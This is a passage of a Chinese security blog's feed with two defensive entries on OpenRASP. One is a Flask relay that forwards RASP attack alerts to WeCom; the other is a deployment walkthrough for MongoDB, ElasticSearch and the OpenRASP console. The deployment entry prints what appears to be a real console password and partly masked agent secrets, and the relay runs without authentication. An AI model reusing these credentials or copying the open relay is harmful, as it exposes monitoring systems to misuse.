(‘“+id+”‘)”);</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;测试用例的选择尽量贴近真实业务使用的场景，覆盖常见的高危漏洞，以及各类请求形式。用于测试IAST产品支持检测漏洞类型、检出率、脏数据插入等等&lt;/p&gt;</summary>
    
    
    
    <category term="安全建设" scheme="http://www.pa55w0rd.online/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
    <category term="SDL" scheme="http://www.pa55w0rd.online/tags/SDL/"/>
    
  </entry>
  
  <entry>
    <title>OpenRASP报警推送</title>
    <link href="http://www.pa55w0rd.online/OpenRASP-alert/"/>
    <id>http://www.pa55w0rd.online/OpenRASP-alert/</id>
    <published>2019-11-08T03:17:19.000Z</published>
    <updated>2019-11-08T05:54:16.318Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>OpenRASP 上线一周了，运行很稳定，拉了几个PHP和Java做测试，没有收到业务方的异常反馈，除了我测试的报警外，只发现一些基线的报警，找运维都处理了。</p><p>随着运营时间，后续安全基线问题不应该存在了，重点关注一下攻击事件，系统设置中有报警推送功能，有邮件报警、HTTP报警推送、钉钉集成、syslog报警</p><span id="more"></span><p>我们目前使用的IM是企业微信，企业微信群机器人推送消息使用很方便，我们把很多告警邮件类都修改为群机器人通知了，把RASP也修改一下吧</p><h2 id="0x01-坎坷"><a href="#0x01-坎坷" class="headerlink" title="0x01 坎坷"></a>0x01 坎坷</h2><p>OpenRASP 管理后台使用GO语言开发的，从菜鸟教程上浏览了下go的基础语法，开始搞，因为只是加个报警推送，就不修改前端了</p><p>从Github上把源码下载下来，有点大</p><p>看下目录结构 openrasp\cloud\src\rasp-cloud MVC模型，业务逻辑应该都在models 文件里， 打开app.go</p><p>找到钉钉推送的函数PushDingAttackAlarm， 复制一个按照企业微信群机器人的消息格式修改一下</p><p>群机器人消息格式</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;msgtype&quot;</span>: <span class="string">&quot;markdown&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;markdown&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;content&quot;</span>: <span class="string">&quot;content&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>找到PushAttackAlarm 修改一下</p><p>然后编译 – 上传测试服务器 – 测试报警失败 – 继续修改 – 编译 – 上传测试服务器 – 测试失败 ……</p><img src="/OpenRASP-alert/bengkui.jpg" class="" title="描述"><p>不知道试了多少次，json数据就是处理不好</p><h2 id="0x02-好像瞧见了光明"><a href="#0x02-好像瞧见了光明" class="headerlink" title="0x02 好像瞧见了光明"></a>0x02 好像瞧见了光明</h2><p>不好搞，回头看了下，自带的报警有一个HTTP报警推送，拿Python flask写一个服务做中转，接收报警消息，一个json格式字符串</p><p>那就好办了，处理下数据，测试环境发送给群机器人成功</p><p>群机器人配置一定要开启推送消息IP白名单，不配置则任何IP都可调用，防止泄露被恶意调用</p><p>把脚本放到线上IDC，what，IDC是禁止请求公网的</p><img src="/OpenRASP-alert/wuqing.jpg" class="" title="描述"><h2 id="0x03-柳暗花明"><a href="#0x03-柳暗花明" class="headerlink" title="0x03 柳暗花明"></a>0x03 柳暗花明</h2><p>之前运维开发了一个企业微信通知应用的内网API调用接口，可以使用这个接口将报警推送到企业微信</p><p>下面附上代码（代码写的有点乱，修改的话可以把这个接口换成机器人）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/alert&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alert</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        log = request.json</span><br><span class="line">        <span class="comment"># print(log[&quot;data&quot;][0])</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>  <span class="string">&#x27;server_nic&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> log[<span class="string">&quot;data&quot;</span>][<span class="number">0</span>].keys():  <span class="comment"># 这里做了异常处理，cmdb接口不能为空，不能为127.0.0.1</span></span><br><span class="line">            <span class="comment"># print(&quot;ip不存在&quot;)</span></span><br><span class="line">            systemName = <span class="string">&quot;请登录后台查看&quot;</span></span><br><span class="line">            firstMan = <span class="string">&quot;请登录后台查看&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ip = log[<span class="string">&quot;data&quot;</span>][<span class="number">0</span>][<span class="string">&quot;server_nic&quot;</span>][<span class="number">0</span>][<span class="string">&#x27;ip&#x27;</span>].encode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">            <span class="comment"># print(type(ip))  # ip类型为unicode，需要做编码转换</span></span><br><span class="line">            <span class="keyword">if</span> ip == <span class="string">&quot;127.0.0.1&quot;</span>:</span><br><span class="line">                systemName = <span class="string">&quot;请登录后台查看&quot;</span></span><br><span class="line">                firstMan = <span class="string">&quot;请登录后台查看&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    data = &#123; <span class="string">&quot;ip&quot;</span>: ip &#125;</span><br><span class="line">                    headers = &#123; <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;&#123;cmdb&#125;&quot;</span> &#125;  <span class="comment"># 运维那边的cmdb系统，查询资产信息的,可以去掉</span></span><br><span class="line">                    rep = requests.post(<span class="string">&quot;http://&#123;cmdb&#125;/api/&quot;</span>, data = data, headers = headers, timeout=<span class="number">2</span>)</span><br><span class="line">                    <span class="comment"># print rep.text</span></span><br><span class="line">                    <span class="keyword">if</span> rep.text:</span><br><span class="line">                        content = rep.text.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                        <span class="keyword">for</span> con <span class="keyword">in</span> content:</span><br><span class="line">                            <span class="keyword">if</span> con.startswith(<span class="string">u&quot;系统名称&quot;</span>):</span><br><span class="line">                                systemName = con.split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>].encode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">                            <span class="keyword">if</span> con.startswith(<span class="string">u&quot;第一负责人&quot;</span>):</span><br><span class="line">                                firstMan = con.split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>].encode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    <span class="comment"># print e</span></span><br><span class="line">                    systemName = <span class="string">&quot;请登录后台查看&quot;</span></span><br><span class="line">                    firstMan = <span class="string">&quot;请登录后台查看&quot;</span></span><br><span class="line"></span><br><span class="line">        content = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">RASP发现攻击成功告警</span></span><br><span class="line"><span class="string">报警时间：&#123;time&#125;</span></span><br><span class="line"><span class="string">攻击类型：&#123;attack&#125;</span></span><br><span class="line"><span class="string">攻击源IP地址：&#123;source&#125;</span></span><br><span class="line"><span class="string">目的URL：&#123;url&#125;</span></span><br><span class="line"><span class="string">系统名称：&#123;sys&#125;</span></span><br><span class="line"><span class="string">第一负责人：&#123;m&#125;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>.<span class="built_in">format</span>(time=log[<span class="string">&#x27;data&#x27;</span>][<span class="number">0</span>][<span class="string">&#x27;event_time&#x27;</span>],attack=log[<span class="string">&#x27;data&#x27;</span>][<span class="number">0</span>][<span class="string">&#x27;attack_type&#x27;</span>],source=log[<span class="string">&#x27;data&#x27;</span>][<span class="number">0</span>][<span class="string">&#x27;attack_source&#x27;</span>],url=log[<span class="string">&#x27;data&#x27;</span>][<span class="number">0</span>][<span class="string">&#x27;url&#x27;</span>],sys=systemName, m=firstMan)</span><br><span class="line">        <span class="comment"># print(content)</span></span><br><span class="line">        log_file = <span class="built_in">open</span>(<span class="string">&#x27;./alert.log&#x27;</span>,<span class="string">&#x27;a&#x27;</span>) </span><br><span class="line">        log_file.write(content)</span><br><span class="line">        log_file.close()</span><br><span class="line">        user = <span class="string">&quot;user1|user2&quot;</span></span><br><span class="line">        weixin = <span class="string">&quot;http://&#123;&#125;/wxchat?user=&#123;0&#125;&amp;content=&#123;1&#125;&amp;token=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(user, content) <span class="comment"># api接口，可以换成群里机器人webhook，需要微调下content格式</span></span><br><span class="line">        r = requests.get(weixin, timeout=<span class="number">2</span>)       </span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;code&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;sucess&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;code&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;message&#x27;</span>: <span class="built_in">str</span>(e)&#125;)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>: </span><br><span class="line">    <span class="comment"># app.run(debug=True)</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure><h2 id="0x04-结果"><a href="#0x04-结果" class="headerlink" title="0x04 结果"></a>0x04 结果</h2><p>以Java反序列化和Struts2-019远程命令执行漏洞为例，从json格式报警中找了event_time、attack_type、attack_source、url，其他关键字先忽略了</p><p>报警推送效果</p><img src="/OpenRASP-alert/2.png" class="" title="描述">]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;OpenRASP 上线一周了，运行很稳定，拉了几个PHP和Java做测试，没有收到业务方的异常反馈，除了我测试的报警外，只发现一些基线的报警，找运维都处理了。&lt;/p&gt;
&lt;p&gt;随着运营时间，后续安全基线问题不应该存在了，重点关注一下攻击事件，系统设置中有报警推送功能，有邮件报警、HTTP报警推送、钉钉集成、syslog报警&lt;/p&gt;</summary>
    
    
    
    <category term="安全建设" scheme="http://www.pa55w0rd.online/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
    <category term="安全防护" scheme="http://www.pa55w0rd.online/tags/%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/"/>
    
  </entry>
  
  <entry>
    <title>OpenRASP 部署</title>
    <link href="http://www.pa55w0rd.online/openrasp-web/"/>
    <id>http://www.pa55w0rd.online/openrasp-web/</id>
    <published>2019-11-04T05:19:50.000Z</published>
    <updated>2019-11-04T05:38:04.547Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>上周一台web服务器部署单机版OpenRASP之后感觉还不错，想在公司内部推广一下，准备在一些后台系统的服务器上安装agent，单机版部署报警日志查看不是很方便，遂部署管理后台方便管理</p><span id="more"></span><h2 id="0x01-准备"><a href="#0x01-准备" class="headerlink" title="0x01 准备"></a>0x01 准备</h2><p>OpenRASP使用了 ElasticSearch 和 MongoDB 两种数据库。前者用来存储报警和统计信息，后者用来存储应用、账号密码等信息。</p><p>自己测试机上有mongodb 3.2 和 elk套件7.1.1，这里对数据库版本有要求</p><ul><li>MongoDB 版本大于等于 3.6</li><li>ElasticSearch 版本大于等于 5.6，小于 7.0</li></ul><p>好吧，都不符合，重新安装MongoDB 和 ElasticSearch</p><h3 id="MongoDB-安装"><a href="#MongoDB-安装" class="headerlink" title="MongoDB 安装"></a>MongoDB 安装</h3><p>官方手册：<a href="https://docs.mongodb.com/manual/tutorial/install-mongodb-on-red-hat/">https://docs.mongodb.com/manual/tutorial/install-mongodb-on-red-hat/</a></p><p>安装mongodb社区版，目前最新版为4.2</p><ol><li>创建仓库<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">vi</span> /etc/yum.repos.d/mongodb-org-<span class="number">4</span>.<span class="number">2</span>.repo</span><br></pre></td></tr></table></figure></li><li>复制<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[mongodb-org-<span class="number">4.2</span>]</span><br><span class="line">name=MongoDB Repository</span><br><span class="line">baseurl=https:<span class="regexp">//</span>repo.mongodb.org<span class="regexp">/yum/</span>redhat<span class="regexp">/$releasever/m</span>ongodb-org<span class="regexp">/4.2/</span>x86_64/</span><br><span class="line">gpgcheck=<span class="number">1</span></span><br><span class="line">enabled=<span class="number">1</span></span><br><span class="line">gpgkey=https:<span class="regexp">//</span>www.mongodb.org<span class="regexp">/static/</span>pgp/server-<span class="number">4.2</span>.asc</span><br></pre></td></tr></table></figure></li><li>yum命令安装mongodb<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum <span class="keyword">install</span> -y mongodb-org</span><br></pre></td></tr></table></figure></li><li>启动服务<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="literal">start</span> mongod</span><br></pre></td></tr></table></figure></li><li>使用<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mongo</span></span><br></pre></td></tr></table></figure></li><li>卸载<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yum erase <span class="constructor">$(<span class="params">rpm</span> -<span class="params">qa</span> | <span class="params">grep</span> <span class="params">mongodb</span>-<span class="params">org</span>)</span></span><br><span class="line">删除数据目录</span><br><span class="line">rm -r /var/log/mongodb</span><br><span class="line">rm -r /var/lib/mongo</span><br></pre></td></tr></table></figure></li><li>启用认证<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi <span class="meta-keyword">/etc/</span>mongod.conf</span><br><span class="line"><span class="symbol">security:</span></span><br><span class="line"><span class="symbol">  authorization:</span> enabled</span><br></pre></td></tr></table></figure></li></ol><h3 id="ElasticSearch-安装"><a href="#ElasticSearch-安装" class="headerlink" title="ElasticSearch 安装"></a>ElasticSearch 安装</h3><p><a href="https://www.elastic.co/cn/downloads/past-releases#elasticsearch">https://www.elastic.co/cn/downloads/past-releases#elasticsearch</a></p><p>下载6版本最新的 <a href="https://www.elastic.co/downloads/past-releases/elasticsearch-6-8-4">https://www.elastic.co/downloads/past-releases/elasticsearch-6-8-4</a></p><p><strong>不能使用root账户启动</strong></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="variable">@Honeypot</span> opt]<span class="comment"># useradd es684</span></span><br><span class="line">[root<span class="variable">@Honeypot</span> opt]<span class="comment"># chown -R es684:es684 /opt/elasticsearch-6.8.4/</span></span><br><span class="line">[root<span class="variable">@Honeypot</span> opt]<span class="comment"># su es684</span></span><br><span class="line">[es684<span class="variable">@Honeypot</span> opt]<span class="variable">$ </span>elasticsearch<span class="number">-6.8</span>.<span class="number">4</span>/bin/elasticsearch</span><br><span class="line"></span><br><span class="line">[root<span class="variable">@Honeypot</span> ~]<span class="comment"># curl http://127.0.0.1:9200</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;name&quot;</span> : <span class="string">&quot;pLQxhPa&quot;</span>,</span><br><span class="line">  <span class="string">&quot;cluster_name&quot;</span> : <span class="string">&quot;elasticsearch&quot;</span>,</span><br><span class="line">  <span class="string">&quot;cluster_uuid&quot;</span> : <span class="string">&quot;ZZHzhK93RvqBf2jzbTFtiQ&quot;</span>,</span><br><span class="line">  <span class="string">&quot;version&quot;</span> : &#123;</span><br><span class="line">    <span class="string">&quot;number&quot;</span> : <span class="string">&quot;6.8.4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;build_flavor&quot;</span> : <span class="string">&quot;default&quot;</span>,</span><br><span class="line">    <span class="string">&quot;build_type&quot;</span> : <span class="string">&quot;tar&quot;</span>,</span><br><span class="line">    <span class="string">&quot;build_hash&quot;</span> : <span class="string">&quot;bca0c8d&quot;</span>,</span><br><span class="line">    <span class="string">&quot;build_date&quot;</span> : <span class="string">&quot;2019-10-16T06:19:49.319352Z&quot;</span>,</span><br><span class="line">    <span class="string">&quot;build_snapshot&quot;</span> : <span class="keyword">false</span>,</span><br><span class="line">    <span class="string">&quot;lucene_version&quot;</span> : <span class="string">&quot;7.7.2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;minimum_wire_compatibility_version&quot;</span> : <span class="string">&quot;5.6.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;minimum_index_compatibility_version&quot;</span> : <span class="string">&quot;5.0.0&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;tagline&quot;</span> : <span class="string">&quot;You Know, for Search&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里两个数据库安装好了，开始安装管理后台</p><h2 id="0x02-管理后台安装"><a href="#0x02-管理后台安装" class="headerlink" title="0x02 管理后台安装"></a>0x02 管理后台安装</h2><ol><li>编辑 conf/app.conf 文件，修正 ElasticSearch 和 MongoDB 两个服务器的地址<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[prod]</span><br><span class="line">EsAddr = http://127.0.0.1:9200</span><br><span class="line">EsUser =</span><br><span class="line">EsPwd =</span><br><span class="line">MongoDBAddr = 127.0.0.1:27017</span><br><span class="line">MongoDBUser =</span><br><span class="line">MongoDBPwd =</span><br></pre></td></tr></table></figure></li></ol><ol start="2"><li>启动后台服务器:<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">./rasp-cloud</span> -d</span><br></pre></td></tr></table></figure></li><li>访问<br>在浏览器里打开 <a href="http://your-ip:8086/">http://your-ip:8086</a><br>登录管理后台。其中用户名固定为 openrasp，初始密码为 admin@123</li></ol><p>用户名：openrasp<br>密 码：!9cN!j!7fThP</p><p>系统设置 - 防护设置 - 关闭记录日志模式</p><p>系统设置 - 通用设置 - 自定义拦截状态码修改为404 ，自定义HTML响应内容修改为自己的404页面</p><h2 id="0x03-添加主机"><a href="#0x03-添加主机" class="headerlink" title="0x03 添加主机"></a>0x03 添加主机</h2><p>点击右上角添加主机，以PHP服务器为例</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">php</span> install.php -d /opt/rasp --app-id <span class="number">171</span>fea<span class="number">1</span>b<span class="number">56790016</span>e<span class="number">91239</span>b<span class="number">3</span>ede<span class="number">558</span>xxxxxxxxxx --app-secret KJIToQ<span class="number">9</span>VqdKq<span class="number">6</span>O<span class="number">0</span>dLxdG<span class="number">1</span>XbIHOxrLZF<span class="number">8</span>xxxxxxxxxxx --backend-url http://your-ip:<span class="number">8086</span></span><br></pre></td></tr></table></figure><p>重启PHP-FPM生效</p><img src="/openrasp-web/1.png" class="" title="描述">]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;上周一台web服务器部署单机版OpenRASP之后感觉还不错，想在公司内部推广一下，准备在一些后台系统的服务器上安装agent，单机版部署报警日志查看不是很方便，遂部署管理后台方便管理&lt;/p&gt;</summary>
    
    
    
    <category term="安全建设" scheme="http://www.pa55w0rd.online/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
    <category term="安全防护" scheme="http://www.pa55w0rd.online/tags/%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/"/>
    
  </entry>
  
</feed>
